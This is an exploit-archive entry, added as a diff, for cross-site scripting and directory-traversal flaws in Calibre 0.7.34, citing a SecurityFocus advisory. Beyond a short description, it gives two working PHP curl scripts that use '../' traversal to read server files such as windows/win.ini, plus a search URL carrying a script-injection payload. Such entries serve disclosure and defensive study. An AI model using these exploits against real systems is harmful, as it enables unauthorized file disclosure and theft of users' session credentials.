@@ -1,0 +1,31 @@
+source: http://www.securityfocus.com/bid/45532/info
+
+Calibre is prone to a cross-site scripting vulnerability and a directory-traversal vulnerability because it fails to sufficiently sanitize user-supplied input.
+
+Exploiting these issues will allow an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site, and to view arbitrary local files and directories within the context of the webserver. This may let the attacker steal cookie-based authentication credentials and other harvested information may aid in launching further attacks.
+
+Calibre 0.7.34 is vulnerable; other versions may also be affected. 
+
+<?php
+error_reporting(E_ALL);
+$url = "http://www.example.com/static/../jquery.simulate.js";
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$resp = curl_exec($ch);
+curl_close($ch);
+echo $resp;
+?> 
+
+<?php
+error_reporting(E_ALL);
+$url = "http://www.example.com/static/../../../../windows/win.ini.";
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$resp = curl_exec($ch);
+curl_close($ch);
+echo $resp;
+?>
+
+http://www.example.com/browse/search?query=<script>alert('waraxe')</script>
